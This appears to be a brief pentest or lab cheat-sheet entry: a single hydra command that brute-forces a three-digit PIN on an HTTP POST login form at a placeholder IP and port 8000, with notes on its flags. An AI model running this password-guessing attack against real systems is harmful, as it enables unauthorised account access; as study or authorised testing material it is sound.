```bash
hydra -l '' -P 3digits.txt -f -v IP http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
```
* -l no username
* -f stop after finding password
* -s port number
